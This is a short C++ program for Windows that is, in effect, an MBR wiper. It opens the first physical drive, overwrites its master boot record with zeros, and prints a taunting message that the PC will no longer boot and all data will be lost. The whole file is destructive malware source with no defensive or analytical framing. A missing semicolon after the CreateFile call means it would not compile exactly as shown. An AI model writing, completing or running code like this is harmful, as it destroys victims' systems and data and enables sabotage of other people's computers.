#include <iostream>
#include <Windows.h>
using namespace std;

#define MBR_SIZE 512

int main() {
  
  DWORD write;
  
  char mbrData[MBR_SIZE]; // size of master boot record
  
  //Overwrite the  MBR
  ZeroMemory(&mbrData, (sizeof mbrData));
  
  HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
    ,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE
    ,NULL,OPEN_EXISTING,NULL,NULL)
    if (WriteFile(MasterBootRecord, mbrData,512,&write,NULL) ==  TRUE) {
      cout << "Your MBR (Master Boot Record) has been overwritten therefore, you can no longer boot your PC. All data will be lost, so enjoy the time on your PC while you still can." << endl;
      Sleep(5000);
      ExitProcess(0);
    }
    else {
      cout << "Failure to overwrite the Master Boot Record" << endl;
      Sleep(5000);
      ExitProcess(0);
    }
  CloseHandle(MasterBootRecord);//Closing  the handle
  return EXIT_SUCCESS;
}
